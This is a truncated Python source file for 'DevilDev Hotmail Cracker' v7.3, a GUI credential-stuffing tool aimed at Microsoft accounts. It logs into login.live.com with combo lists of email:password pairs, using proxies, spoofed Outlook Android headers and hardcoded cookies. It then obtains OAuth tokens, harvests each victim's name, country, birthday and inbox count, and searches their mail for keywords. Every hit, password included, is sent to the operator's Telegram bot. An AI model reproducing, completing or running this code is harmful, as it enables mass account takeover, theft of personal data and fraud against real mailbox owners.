# ============================================================
# DevilDev Hotmail Cracker - CustomTkinter GUI v7.3
# ============================================================
#
# Yazar   : DevilDev
# Sürüm   : 7.3
# ============================================================

import tkinter as tk
from tkinter import filedialog, messagebox, ttk
import customtkinter as ctk
import threading
import queue
import time
import random
import urllib.parse
import re
import requests
import json
import os
import csv
import sys
from pathlib import Path
from datetime import datetime
import pickle
import logging
from logging.handlers import RotatingFileHandler

# --- Grafik ---
import matplotlib
matplotlib.use("TkAgg")
from matplotlib.figure import Figure
from matplotlib.backends.backend_tkagg import FigureCanvasTkAgg

# --- Sistem Tepsisi ---
try:
    import pystray
    from PIL import Image, ImageDraw
    HAS_TRAY = True
except:
    HAS_TRAY = False

# --- Ses ---
try:
    import winsound
    SOUNDS = {
        "beep": lambda: winsound.Beep(1000, 300),
        "ding": lambda: winsound.Beep(1500, 200),
        "buzz": lambda: winsound.Beep(500, 500),
        "silent": lambda: None
    }
except:
    def no_sound(): pass
    SOUNDS = {
        "beep": no_sound,
        "ding": no_sound,
        "buzz": no_sound,
        "silent": no_sound
    }

# --- Bildirim ---
try:
    from win10toast import ToastNotifier
    HAS_TOAST = True
except:
    HAS_TOAST = False

# --- Dil Sözlüğü (TÜM ANAHTARLAR EKLENDİ) ---
LANGUAGES = {
    "tr": {
        "title": "DevilDev Mail Analizörü v7.3",
        "combo_label": "Combo Dosyası:",
        "keyword_label": "Keyword Dosyası:",
        "proxy_list_label": "Proxy Listesi (opsiyonel):",
        "threads_label": "Threads:",
        "checkpoint_interval_label": "Checkpoint Aralığı:",
        "retry_label": "Max Retry:",
        "telegram_token": "Telegram Token:",
        "telegram_chat": "Chat ID:",
        "start_btn": "███████ BAŞLAT ███████",
        "stop_btn": "DURDUR",
        "export_btn": "📊 İstatistikleri Dışa Aktar",
        "hit": "HIT",
        "free": "FREE",
        "bad": "BAD",
        "retry": "RETRY",
        "total": "TOPLAM",
        "cpm": "CPM",
        "success_rate": "BAŞARI %",
        "status": "DURUM",
        "ready": "HAZIR",
        "running": "ÇALIŞIYOR",
        "filter_all": "Tümü",
        "results_table": "📋 Sonuçlar",
        "live_log": "🛡 CANLI LOG",
        "clear": "Temizle",
        "speed": "Hız:",
        "eta": "Kalan:",
        "progress": "%",
        "export_csv": "CSV dosyası",
        "copy_email": "Email'i Kopyala",
        "copy_password": "Şifreyi Kopyala",
        "copy_row": "Tüm Satırı Kopyala",
        "delete_row": "Sil",
        "combo_editor": "Combo Düzenleyici",
        "add_combo": "Ekle",
        "remove_combo": "Sil",
        "theme_selector": "Tema Seç",
        "language_selector": "Dil",
        "sound_label": "Ses Seçeneği:",
        "filter_regex": "Regex Filtre:",
        "filter_placeholder": ".*@gmail.com",
        "log_to_file": "Log dosyasına kaydet",
        "search_placeholder": "Email ara...",
        "tray_show": "Göster",
        "tray_hide": "Gizle",
        "tray_exit": "Çıkış",
        "checkpoint_label": "Checkpoint (kaldığın yerden devam)"
    },
    "en": {
        "title": "DevilDev Mail Analyzer v7.3",
        "combo_label": "Combo File:",
        "keyword_label": "Keyword File:",
        "proxy_list_label": "Proxy List (optional):",
        "threads_label": "Threads:",
        "checkpoint_interval_label": "Checkpoint Interval:",
        "retry_label": "Max Retry:",
        "telegram_token": "Telegram Token:",
        "telegram_chat": "Chat ID:",
        "start_btn": "███████ START ███████",
        "stop_btn": "STOP",
        "export_btn": "📊 Export Statistics",
        "hit": "HIT",
        "free": "FREE",
        "bad": "BAD",
        "retry": "RETRY",
        "total": "TOTAL",
        "cpm": "CPM",
        "success_rate": "SUCCESS %",
        "status": "STATUS",
        "ready": "READY",
        "running": "RUNNING",
        "filter_all": "All",
        "results_table": "📋 Results",
        "live_log": "🛡 LIVE LOG",
        "clear": "Clear",
        "speed": "Speed:",
        "eta": "ETA:",
        "progress": "%",
        "export_csv": "CSV file",
        "copy_email": "Copy Email",
        "copy_password": "Copy Password",
        "copy_row": "Copy Row",
        "delete_row": "Delete",
        "combo_editor": "Combo Editor",
        "add_combo": "Add",
        "remove_combo": "Remove",
        "theme_selector": "Theme Select",
        "language_selector": "Language",
        "sound_label": "Sound Option:",
        "filter_regex": "Regex Filter:",
        "filter_placeholder": ".*@gmail.com",
        "log_to_file": "Save log to file",
        "search_placeholder": "Search email...",
        "tray_show": "Show",
        "tray_hide": "Hide",
        "tray_exit": "Exit",
        "checkpoint_label": "Checkpoint (resume from last)"
    }
}

# --- Config ---
CONFIG_FILE = "devildev_config.json"

def load_config():
    default = {
        "combo_file": "",
        "keyword_file": "",
        "proxy_file": "",
        "thread_count": 20,
        "tg_token": "",
        "tg_chat": "",
        "theme": "Dark",
        "sound": True,
        "language": "tr",
        "color_theme": "red",
        "tray_enabled": True,
        "sound_choice": "beep",
        "log_to_file": False,
        "checkpoint_enabled": True,
        "checkpoint_interval": 50,
        "max_retry": 3
    }
    if Path(CONFIG_FILE).exists():
        try:
            with open(CONFIG_FILE, "r") as f:
                return json.load(f)
        except:
            return default
    return default

def save_config(config):
    with open(CONFIG_FILE, "w") as f:
        json.dump(config, f, indent=2)

# ---------- Telegram Notifier ----------
class TelegramNotifier:
    def __init__(self, token: str, chat_id: str):
        self.token = token
        self.chat_id = chat_id
        self.api_url = f"https://api.telegram.org/bot{token}"

    def send_hit(self, email: str, password: str, captures: dict, matches: dict):
        try:
            profil = "\n".join(f"• {k}: {v}" for k, v in captures.items())
            bulunan = "\n".join(
                f"✅ {kw}: {data['total']} mesaj — {data['last_msg'][:50]}"
                for kw, data in matches.items()
            )
            mesaj = (
                f"🔱 <b>HIT BULUNDU (DevilDev v7.3)</b>\n\n"
                f"📧 <b>Email:</b> <code>{email}</code>\n"
                f"🔑 <b>Şifre:</b> <code>{password}</code>\n\n"
                f"👤 <b>Profil:</b>\n{profil}\n\n"
                f"🔎 <b>Eşleşen Keywordler:</b>\n{bulunan}\n\n"
                f"⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊\n"
                f"<b>🛡️ DevilDev Cracker v7.3</b>"
            )
            requests.post(
                f"{self.api_url}/sendMessage",
                json={
                    "chat_id": self.chat_id,
                    "text": mesaj,
                    "parse_mode": "HTML",
                    "disable_web_page_preview": True
                },
                timeout=15
            )
        except Exception:
            pass

# ---------- Özel Hata ----------
class LoginError(Exception):
    pass

# ============================================================
# HotmailChecker Sınıfı (TAM VE SAĞLAM)
# ============================================================
class HotmailChecker:
    def __init__(self, email: str, password: str, keywords: list = None, proxy: str = None):
        self.email = email
        self.password = password
        self.keywords = keywords if keywords else []
        self.session = requests.Session()
        
        if proxy:
            proxy_dict = {"http": proxy, "https": proxy}
            self.session.proxies.update(proxy_dict)
        
        self.ua = (
            "Mozilla/5.0 (Linux; Android 12; SM-G988N Build/NRD90M; wv) "
            "AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 "
            "Chrome/95.0.4638.74 Mobile Safari/537.36 PKeyAuth/1.0"
        )
        self.session.headers.update({
            "User-Agent": self.ua,
            "Accept-Language": "en-US,en;q=0.9",
        })

        self.code = None
        self.refresh_token = None
        self.access_token = None
        self.substrate_token = None
        self.cid = None
        self.captures = {}
        self.coid = "3d0f0eea-617a-4b9c-a747-100934dca583"

    @staticmethod
    def url_encode(text: str) -> str:
        return urllib.parse.quote(text, safe="")

    def get_cookie_string(self) -> str:
        return "; ".join(f"{c.name}={c.value}" for c in self.session.cookies)

    def extract_code(self, text: str) -> str | None:
        match = re.search(r"[?&]code=([^&#\s\"']+)", text)
        if match:
            return urllib.parse.unquote(match.group(1))
        match = re.search(r'"code"\s*:\s*"([^"]+)"', text)
        if match:
            return match.group(1)
        return None

    def login(self) -> bool:
        us = self.url_encode(self.email)
        ps = self.url_encode(self.password)

        login_url = (
            "https://login.live.com/ppsecure/post.srf"
            "?client_id=0000000048170EF2"
            "&contextid=E5D8A9B73286B7E0"
            "&opid=EED8E3DBCC1AAA6A"
            "&bk=1726223182"
            "&uaid=3d0f0eea617a4b9ca747100934dca583"
            "&pid=15216"
        )

        payload = (
            "ps=2&psRNGCDefaultType=1&psRNGCEntropy=&psRNGCSLK=-DmudFdPtArk2f9r5G2PufUpIRX8Q9eTm0uFuxS%21hSx27M79PeFyCVNx8l*VUvBBCZwJL62A9FEyKuXoxgKbI96TjlB*EvImvYFtSQP1wJLfwKYWtRUwse4dkf5WNXBy4f3cLPgvJUS1dNFFN4dQAhcmYSlgRfH5J8LYwg3IxmSUcIY%212SkUUWsssgF35aoj%21gcQGM0O0sAJysZGUcmHQJbJ0hIbBG3yJhkeQLukMukTf"
            "&canary=&ctx=rQQIARAA4-Iz1DPUM9BOTLFItDAwMhViNNRiNtIzsBIwgAITC0NzA1c3oyIhLoFXfPy2VYlzvJe7C3Ca3FnavIOR8QIj4yQmsbzElKr48tSkpHyHjPyS3MTMHL3k_NwLTIy3mPj9HUtLMoxARH5RZlXqJmbO5Py84tLc1KLiU8xO-WlpOZl5qfGJycmpxcUK-QWpeZkpCgVF-WmZOakKxalFZZnJqVZW-aUlOfn52XpA5UA-yHArK18nz_jgYJ8bzIwXWBhfsfBwMAowSjAoMGhoGDD-YGFcxAp08bEnm6pv3i5y6C5O7eyxLGE4xapfHl7qZOJr4WdalZhT4Z8f4pkbkudV5ZzqZeyd6mfkGOpvlOyWnFgVEOrna2tqZfiDlXECGxAJn2IT8g129NGrKMhJLNFLzEspys9M-cDG0MHOsItTK6OkpKDYSl8_Jz89M08vJ7MM7Ej9_ESQ3w3iU1KLs0vyC_SKi9JmcDHe4uHj4sxILE7OKMrPTQWG-QFehh98a482T33xe8s7jw0CDA8EGCYJsnMxA-NGgBEA0"
            "&hpgrequestid=&PPFT=-Dthk7KM0CcBognHLIww755uCZB5%21Bu7m0e12TJTvKQxteHh9t6VfghqUlt7cYV4*a%21RMEJTP9hmig2BsgHRUrv2uDOS9ATAi4O%21tGitoYrHZifX5YWtvttGdTH3624e8BFApW%21PxPogDIIFO8P5N5D9IdEtmsTG87fjOlbYry3wl20FV7nt4YM7mlRZDnd*c7HjVpbIE%21eAr0HCbiX9SUJYKmdpvfqCC%21y6GNCug%211cRYmi%21k%21Tp4blIALTbVOAh9A%24%24"
            "&PPSX=Pas&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=0&isSignupPost=0&isRecoveryAttemptPost=0&i13=1"
            f"&login={us}&loginfmt={us}&type=11&LoginOptions=1&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd={ps}"
        )

        headers = {
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
            "Accept-Encoding": "gzip, deflate",
            "Accept-Language": "en-US,en;q=0.9",
            "Cache-Control": "max-age=0",
            "Connection": "keep-alive",
            "Content-Type": "application/x-www-form-urlencoded",
            "Host": "login.live.com",
            "Origin": "https://login.live.com",
            "Referer": (
                "https://login.live.com/oauth20_authorize.srf?client_id=0000000048170EF2"
                "&scope=offline_access+openid+profile+service%3a%3aoutlook.office.com%3a%3aMBI_SSL"
                "&redirect_uri=https%3a%2f%2flogin.live.com%2foauth20_desktop.srf&response_type=code"
                "&login_hint=nadz_webbo%40hotmail.com&x-client-SKU=MSAL.xplat.android"
                "&x-client-Ver=1.1.0%2bad8a8025&uaid=3d0f0eea617a4b9ca747100934dca583"
                "&msproxy=1&issuer=mso&tenant=consumers&ui_locales=en-US&client_info=1"
                "&epct=PAQABDgEAAAApTwJmzXqdR4BN2miheQMYtnkwRi0KYRBFtiOdZWedDcJo1x9nkE77oPupHA89D0sKWIqlJtDjwdE8G83lJBW6B5l1WNYBlZ3nk7XTxORpBxSFUJMD0i62-IiTlh6Eo_n5qerCKhTsdwoLQxSRvgLKdJcTjAEJ-Irl78Q8tBQcLDArONnm7z72MYf4HOzF5Ad9Cm-MIpCwrG_jOBp9IKcq7eZtWTLGBIk9UtPCtt6t6SAA"
                "&jshs=0&haschrome=1&passKeyAuth=1.0%2fpasskey"
                "&ctx=rQQIARAA4-Iz1DPUM9BOTLFItDAwMhViNNRiNtIzsBIwgAITC0NzA1c3oyIhLoFXfPy2VYlzvJe7C3Ca3FnavIOR8QIj4yQmsbzElKr48tSkpHyHjPyS3MTMHL3k_NwLTIy3mPj9HUtLMoxARH5RZlXqJmbO5Py84tLc1KLiU8xO-WlpOZl5qfGJycmpxcUK-QWpeZkpCgVF-WmZOakKxalFZZnJqVZW-aUlOfn52XpA5UA-yHArK18nz_jgYJ8bzIwXWBhfsfBwMAowSjAoMGhoGDD-YGFcxAp08bEnm6pv3i5y6C5O7eyxLGE4xapfHl7qZOJr4WdalZhT4Z8f4pkbkudV5ZzqZeyd6mfkGOpvlOyWnFgVEOrna2tqZfiDlXECGxAJn2IT8g129NGrKMhJLNFLzEspys9M-cDG0MHOsItTK6OkpKDYSl8_Jz89M08vJ7MM7Ej9_ESQ3w3iU1KLs0vyC_SKi9JmcDHe4uHj4sxILE7OKMrPTQWG-QFehh98a482T33xe8s7jw0CDA8EGCYJsnMxA-NGgBEA0"
            ),
            "Sec-Fetch-Dest": "document",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-Site": "same-origin",
            "Sec-Fetch-User": "?1",
            "Upgrade-Insecure-Requests": "1",
            "X-Requested-With": "com.microsoft.office.outlook",
        }

        # Ön çerezler
        self.session.cookies.set("MSPRequ", "id=N&lt=1726223182&co=1", domain="login.live.com")
        self.session.cookies.set("uaid", "3d0f0eea617a4b9ca747100934dca583", domain="login.live.com")
        self.session.cookies.set("RefreshTokenSso", "Dgk7lfaShHcQZcgrBYCkHQ6rOBVO9XNFLG0UAhAxkdv3VSeG!mMx2aqqQMTkrp8KSTESlUReGSb3Ga!BIkVRZHv!QEw85VrPUHcQOwkT5gYS2J*TjQeUULzkFbF1HDRsHYZIIfqG741wN3NfHwr6KXo$", domain="login.live.com")
        self.session.cookies.set("MSPOK", "$uuid-90478d00-dd39-405a-8731-bd22329637de", domain="login.live.com")
        self.session.cookies.set("OParams", "11O.DsdeQF2y3fsl3M9I0rhb6w95IwZaderdmXLRh6pKeUGbd1PqLEw8JTc28KdKuOsGYu!PzrPkEGJhuQmW*uMSRDsAjGDX0QElSnaFWMErTliKbWK5a9BWYp2c!aK8z1lwcscrbAr1548TFJxSZPl!9Eqk08i0mhxSQsfi7uARKID6R49B4664XQmPGN3CUdfFYjYwW4!lCPLt5BN9cFkaimWnB1wTV!klMzGgtIdHbgmRPzb4WqATStbDaOgvt6JQ6ceoWkz7q*lyN7B4URaaaUJyG1A4oUMzS!7EStUP250VY3RPJB!YAQgq0ft9H4FvXQEjx!FkN7WskkkMbJZ*wAZYEGRgEoPyigP*vrE5zjQIfJ4VB5NvsuhAYbCS5bNRPxOFO7b2o5!AC2jNOGSJytHxKQQnCUcTBcvx1PAjAi2kuEPWTiOjJOxXidNu33PX5kNTriDyGCz46KlHu7ZnFS3QryeAf0lgEZyanDBiFpBvFZE1kxFXen20cH4GIavuKM!99iqdMI6vee7AQgrrDerhcvoSLfVnii5K7xW1B1NUZxihRGFhHw8oJGm4TV2Krs5ICuvSJz9asEHNwvDBZR37UPJjrfBqHkoDM8!3nQ**PGfGam1Vv3xXpjaCuNUy4LCvUrrrO3cyBYCdKp0J16JvEATRytd!jfu*OwJpLnwOoQ6oRVyqFAC99Dp9elLxcbE2rZnZ1gUblQcmFY3ZcHtyLC7faZt*4SzJEaFZ1FCYIgSjyEajoc4213d1dz7vdfBJwsihLN!Y8QoIp0gFo!DM6ltWkmowBRD1hxr!!M60DG5jz75KOPdvVDqlnvbVXf0LqEMoRwsruk65gEF3Dy1Z!yNS5V6q5PSFQj5SvyG!EWon7Mbn6KsyTGBP9tOLdmFHVlie7IX8lBlQf2*z2PjGlEhUn!V6OM0*GHDtqyPuoJMtBIhBSFG4etMhl4UJvOcnyzWdw0PNhGBt6DUiTlDGmtKJMgkH4KyhI1bUoJ26pGSF0mAlFpqtiSNcSdcz1C*0HLUMTbtNW!6q9JZSgF3Gu!8TOsaqV60kiA3iQfQg9IrEtTt6RXDhgLsHzzYYpJy51cRGIk4u5hbVFNAyTZFUuSBpMWCPXFMqo6ZRbkpgKgl7c!j2kbrtVtUC83paGru7Af4!rS1qMgz4xP9d1W7yZDJCd38FmQgUzMFmO8wH0ISVq9m4XbGnzJDvlkI6PI0H1XJz008Q9I5VjDRgzlHPZ4beD8UeTbbt!*r0sZh5f39oQEkpUWgbL2VVQQEKzAdO0O6360kXJObygeg7gr8GIOYsjq4w7W9BX52ESfBBy0dmsx3FPiHgnkCI9lrp!4G!H0sEuPW38zcDrMLF1GxsfGRZ5cL6cfNSo75QFqqQ4j372o6Cr5XjBXv*8wnrB5iYlbZkkkGtLkdhPvo8Wy9Lxl!jr80Y1n98mGdTZPId", domain="login.live.com")
        self.session.cookies.set("MicrosoftApplicationsTelemetryDeviceId", "ac497201-f3d3-41a7-883c-c50515eabaca", domain="login.live.com")
        self.session.cookies.set("ai_session", "fiaZX16SGDUFsD1Xch3TeF|1726223182490|1726223182490", domain="login.live.com")
        self.session.cookies.set("MUID", "354ca661609b474d9471b6de17e93df7", domain="login.live.com")
        self.session.cookies.set("fptctx2", "taBcrIH61PuCVH7eNCyH0K%252fD9DJ44Cptuv0RyrXgXCtEN7M2YMZXcDGxJBSYuGaBLu%252f9JiKDcHLb%252f8JINIhnqSktvc1WTHmZoNaDBGu0QNkIeXqEXSCok8RtGp9vucSE3bH5AyTgKraZz30bwBlRTs8zdebR61peqnbTMLSFu6Z%252fZI8YhEdhzrq6nSuKh7inDsCtL6VZeyS07TLSEhlzeZHY%252fjvAzMVzeXcFDOYLj9JQT%252fFVpLid%252bKgDYOoV40MX%252f0cn4aUVeWt%252bSo7YLMbJTg5NfzPcPtwlcy%252f8xu9HYDOWFtE6HZ%252b3j%252bSBwN5QxLYZkyNTTaCh7UxRHmNg2bu3qw%253d%253d", domain="login.live.com")
        self.session.cookies.set("MSFPC", "GUID=23978213118146a292284de1afde68a9&HASH=2397&LV=202409&V=4&LU=1726223190403", domain="login.live.com")

        time.sleep(random.uniform(0.2, 0.5))
        resp = self.session.post(login_url, data=payload, headers=headers, allow_redirects=True, timeout=30)
        text = resp.text
        url = str(resp.url)
        cookies = self.get_cookie_string()

        if "Sign in to your Microsoft account" in text:
            raise LoginError("BAD")
        if ",AC:null,urlFedConvertRename" in text:
            raise LoginError("IP BAN")
        if any(k in text for k in (
            "account.live.com/recover?mkt",
            "recover?mkt",
            "account.live.com/identity/confirm?mkt",
            "/Abuse?mkt="
        )):
            raise LoginError("2FA")

        self.code = self.extract_code(url) or self.extract_code(text)

        success = False
        if self.code:
            success = True
        elif "ANON" in cookies:
            success = True
        elif "WLSSC" in cookies:
            success = True
        elif "https://login.live.com/oauth20_desktop.srf" in url:
            success = True
        elif "sSigninName" in text:
            success = True
        elif "access_token" in text or "refresh_token" in text:
            success = True
        elif "window.location" in text and self.extract_code(text):
            success = True
        elif "i0281" not in text and "loginfmt" not in text:
            success = True

        if not success:
            raise LoginError("BAD")

        cid = self.session.cookies.get("MSPCID", "")
        self.cid = cid.upper() if cid else None
        return True

    def exchange_code_for_tokens(self) -> bool:
        if not self.code:
            return False

        url = "https://login.microsoftonline.com/consumers/oauth2/v2.0/token"
        data = (
            "client_info=1&client_id=0000000048170EF2"
            "&redirect_uri=https%3A%2F%2Flogin.live.com%2Foauth20_desktop.srf"
            f"&grant_type=authorization_code&code={self.code}"
            "&scope=offline_access%20openid%20profile%20service%3A%3Aoutlook.office.com%3A%3AMBI_SSL"
        )
        headers = {
            "Accept-Encoding": "gzip",
            "client-request-id": "3d0f0eea-617a-4b9c-a747-100934dca583",
            "Connection": "Keep-Alive",
            "Content-Type": "application/x-www-form-urlencoded; charset=utf-8",
            "correlation-id": "3d0f0eea-617a-4b9c-a747-100934dca583",
            "Host": "login.microsoftonline.com",
            "return-client-request-id": "false",
            "User-Agent": "Mozilla/5.0 (compatible; MSAL 1.0)",
            "x-client-OS": "32",
            "x-client-SKU": "MSAL.xplat.android",
            "x-client-src-SKU": "MSAL.xplat.android",
            "x-client-Ver": "1.1.0+ad8a8025",
        }

        time.sleep(random.uniform(0.1, 0.3))
        try:
            resp = self.session.post(url, data=data, headers=headers, timeout=30)
            j = resp.json()
            self.refresh_token = j.get("refresh_token")
            self.access_token = j.get("access_token")
            return bool(self.refresh_token and self.access_token)
        except Exception:
            return False

    def refresh_substrate_token(self) -> bool:
        if not self.refresh_token:
            return False

        try:
            self.session.get(
                "https://odc.officeapps.live.com/odc/v2.1/federationprovider?domain=9188040d-6c67-4c5b-b112-36a304b66dad",
                headers={
                    "Accept-Encoding": "gzip",
                    "Connection": "Keep-Alive",
                    "Enlightened-Hrd-Client": "1",
                    "Host": "odc.officeapps.live.com",
                    "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 12; SM-G988N Build/NRD90M)",
                    "X-CorrelationId": "3d0f0eea-617a-4b9c-a747-100934dca583",
                    "X-Office-Application": "145",
                    "X-Office-Platform": "Android",
                    "X-Office-Platform-Version": "32",
                    "X-Office-Version": "4.2424.2",
                    "X-OneAuth-AppId": "com.microsoft.office.outlook",
                    "X-OneAuth-AppName": "OutlookOneAuth",
                    "X-OneAuth-Version": "2.5.0",
                },
                timeout=30
            )
        except Exception:
            pass

        url = "https://login.microsoftonline.com/9188040d-6c67-4c5b-b112-36a304b66dad/oauth2/v2.0/token"
        data = (
            "client_info=1&client_id=0000000048170EF2"
            f"&refresh_token={urllib.parse.quote(self.refresh_token, safe='')}"
            "&scope=profile%20openid%20offline_access%20https%3A%2F%2Fsubstrate.office.com%2F.default"
            "&grant_type=refresh_token"
        )
        headers = {
            "Accept-Encoding": "gzip",
            "client-request-id": "3d0f0eea-617a-4b9c-a747-100934dca583",
            "Connection": "Keep-Alive",
            "Content-Type": "application/x-www-form-urlencoded; charset=utf-8",
            "correlation-id": "3d0f0eea-617a-4b9c-a747-100934dca583",
            "Host": "login.microsoftonline.com",
            "return-client-request-id": "false",
            "User-Agent": "Mozilla/5.0 (compatible; MSAL 1.0)",
            "x-client-OS": "32",
            "x-client-SKU": "MSAL.xplat.android",
            "x-client-src-SKU": "MSAL.xplat.android",
            "x-client-Ver": "1.1.0+ad8a8025",
        }

        time.sleep(random.uniform(0.1, 0.3))
        try:
            resp = self.session.post(url, data=data, headers=headers, timeout=30)
            j = resp.json()
            self.substrate_token = j.get("access_token")
            return bool(self.substrate_token)
        except Exception:
            return False

    def fetch_profile(self) -> bool:
        if not self.substrate_token or not self.cid:
            return False

        urls = [
            "https://substrate.office.com/profileb2/v2.0/me/V1Profile",
            "https://substrate.office.com/profileb2/v2.0/me/profile",
        ]

        for url in urls:
            headers = {
                "Accept-Encoding": "gzip",
                "Authorization": f"Bearer {self.substrate_token}",
                "Connection": "Keep-Alive",
                "Host": "substrate.office.com",
                "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 12; SM-G988N Build/NRD90M)",
                "X-AnchorMailbox": f"CID:{self.cid}",
                "X-ClientRequestId": "3d0f0eea-617a-4b9c-a747-100934dca583",
            }

            time.sleep(random.uniform(0.1, 0.2))
            try:
                resp = self.session.get(url, headers=headers, timeout=30)
                data = resp.json()

                names = data.get("names", [])
                if names:
                    first = names[0].get("firstName", "").strip()
                    last = names[0].get("lastName", "").strip()
                    display = names[0].get("displayName", "").strip()
                    if display:
                        self.captures["Name"] = display
                    elif first or last:
                        self.captures["Name"] = f"{first} {last}".strip()

                accounts = data.get("accounts", [])
                if accounts:
                    cc = accounts[0].get("countryCode", "").strip()
                    if cc:
                        self.captures["Country"] = cc

                anniversaries = data.get("anniversaries", [])
                for ann in anniversaries:
                    if str(ann.get("type", "")).lower() == "birthday":
                        day = ann.get("day", "")
                        month = ann.get("month", "")
                        year = ann.get("year", "")
                        if day or month or year:
                            self.captures["Birthday"] = f"{day}-{month}-{year}"
                        break

                if not self.captures.get("Name"):
                    name = data.get("displayNameDefault") or data.get("displayName") or data.get("name", "")
                    if name:
                        self.captures["Name"] = name
                if not self.captures.get("Country"):
                    cc = data.get("countryCode") or data.get("country") or data.get("location", "")
                    if cc:
                        self.captures["Country"] = cc
                if not self.captures.get("Birthday"):
                    day = data.get("birthDay", "")
                    month = data.get("birthMonth", "")
                    year = data.get("birthYear", "")
                    if day or month or year:
                        self.captures["Birthday"] = f"{day}-{month}-{year}"

                if self.captures.get("Name") or self.captures.get("Country"):
                    return True

            except Exception:
                pass

        return False

    def get_inbox_count(self) -> int:
        if not self.substrate_token:
            return 0

        url = f"https://outlook.live.com/owa/{self.email}/startupdata.ashx?app=Mini&n=0"
        headers = {
            "Host": "outlook.live.com",
            "content-length": "0",
            "x-owa-sessionid": self.coid,
            "x-req-source": "Mini",
            "authorization": f"Bearer {self.substrate_token}",
            "user-agent": "Mozilla/5.0 (Linux; Android 12; SM-G988N Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/95.0.4638.74 Mobile Safari/537.36",
            "action": "StartupData",
            "x-owa-correlationid": self.coid,
            "ms-cv": "YizxQK73vePSyVZZXVeNr+.3",
            "content-type": "application/json; charset=utf-8",
            "accept": "*/*",
            "origin": "https://outlook.live.com",
            "x-requested-with": "com.microsoft.office.outlook",
            "sec-fetch-site": "same-origin",
            "sec-fetch-mode": "cors",
            "sec-fetch-dest": "empty",
            "referer": "https://outlook.live.com/",
            "accept-encoding": "gzip, deflate",
            "accept-language": "en-US,en;q=0.9",
        }

        time.sleep(random.uniform(0.1, 0.3))
        try:
            resp = self.session.post(url, headers=headers, timeout=30)
            text = resp.text
            patterns = [
                r'DisplayName\\":\\"Inbox\\",\\"TotalCount\\":(\\d+)',
                r'DisplayName":"Inbox","TotalCount":(\d+)',
                r'"Inbox".*?"TotalCount":(\d+)',
                r'TotalCount":(\d+).*?"Inbox"',
            ]
            for pat in patterns:
                match = re.search(pat, text)
                if match:
                    total = int(match.group(1))
                    self.captures["Inbox"] = str(total)
                    return total
        except Exception:
            pass
        return 0

    def search_keyword(self, keyword: str) -> dict:
        if not self.substrate_token or not self.cid:
            return {"total": 0, "last_msg": ""}

        url = "https://outlook.live.com/search/api/v2/query?n=124&cv=tNZ1DVP5NhDwG%2FDUCelaIu.124"

        payload = {
            "Cvid": "7ef2720e-6e59-ee2b-a217-3a4f427ab0f7",
            "Scenario": {"Name": "owa.react"},
            "TimeZone": "Egypt Standard Time",
            "TextDecorations": "Off",
            "EntityRequests": [
                {
                    "EntityType": "Conversation",
                    "ContentSources": ["Exchange"],
                    "Filter": {
                        "Or": [
                            {"Term": {"DistinguishedFolderName": "msgfolderroot"}},
                            {"Term": {"DistinguishedFolderName": "DeletedItems"}}
                        ]
                    },
                    "From": 0,
                    "Query": {"QueryString": keyword},
                    "RefiningQueries": None,
                    "Size": 25,
                    "Sort": [
                        {"Field": "Score", "SortDirection": "Desc", "Count": 3},
                        {"Field": "Time", "SortDirection": "Desc"}
                    ],
                    "EnableTopResults": True,
                    "TopResultsCount": 3
                }
            ],
            "AnswerEntityRequests": [
                {
                    "Query": {"QueryString": keyword},
                    "EntityTypes": ["Event", "File"],
                    "From": 0,
                    "Size": 10,
                    "EnableAsyncResolution": True
                }
            ],
            "QueryAlterationOptions": {
                "EnableSuggestion": True,
                "EnableAlteration": True,
                "SupportedRecourseDisplayTypes": [
                    "Suggestion", "NoResultModification",
                    "NoResultFolderRefinerModification",
                    "NoRequeryModification", "Modification"
                ]
            },
            "LogicalId": "446c567a-02d9-b739-b9ca-616e0d45905c"
        }

        headers = {
            "User-Agent": "Outlook-Android/2.0",
            "Pragma": "no-cache",
            "Accept": "application/json",
            "ForceSync": "false",
            "Authorization": f"Bearer {self.substrate_token}",
            "X-AnchorMailbox": f"CID:{self.cid}",
            "Host": "substrate.office.com",
            "Connection": "Keep-Alive",
            "Accept-Encoding": "gzip",
            "Content-Type": "application/json",
        }

        time.sleep(random.uniform(0.1, 0.2))
        try:
            resp = self.session.post(url, json=payload, headers=headers, timeout=30)
            data = resp.json()

            total = data.get("Total", 0)
            count = 0
            last_msg = ""
            results = []

            try:
                entity_sets = data.get("EntitySets", [])
                if entity_sets and len(entity_sets) > 0:
                    result_sets = entity_sets[0].get("ResultSets", [])
                    if result_sets and len(result_sets) > 0:
                        results = result_sets[0].get("Results", [])
                        count = len(results)
                        if results and len(results) > 0:
                            last_msg = (
                                results[0].get("ConversationTopic", "") or
                                results[0].get("Preview", "") or
                                results[0].get("Subject", "")
                            )
            except Exception:
                pass

            total_count = max(total, count)
            return {"total": total_count, "last_msg": last_msg}
        except Exception:
            return {"total": 0, "last_msg": ""}

    def search_keywords(self) -> dict:
        matches = {}
        for kw in self.keywords:
            if not kw.strip():
                continue
            res = self.search_keyword(kw.strip())
            if res["total"] > 0:
                matches[kw.strip()] = res
        return matches

    def run(self) -> tuple[str, dict, dict]:
        self.login()

        if self.exchange_code_for_tokens():
            self.refresh_substrate_token()
            self.fetch_profile()
            self.get_inbox_count()

            if self.keywords:
                matches = self.search_keywords()
                if matches:
                    return "HIT", self.captures, matches
                else:
                    return "FREE", self.captures, {}
            else:
                return "FREE", self.captures, {}

        return "BAD", {}, {}

# ---------- İstatistik Sınıfı ----------
class Stats:
    def __init__(self):
        self.lock = threading.Lock()
        self.total = 0
        self.hits = 0
        self.free = 0
        self.bad = 0
        self.retry = 0
        self.start_time = time.time()
        self.history = []  # (time, hit, free, bad)
        self.rate_history = []  # (time, success_rate)

    def add(self, stat_type: str):
        with self.lock:
            self.total += 1
            if stat_type == "hit":
                self.hits += 1
            elif stat_type == "free":
                self.free += 1
            elif stat_type == "bad":
                self.bad += 1
            elif stat_type == "retry":
                self.retry += 1
            if self.total % 10 == 0:
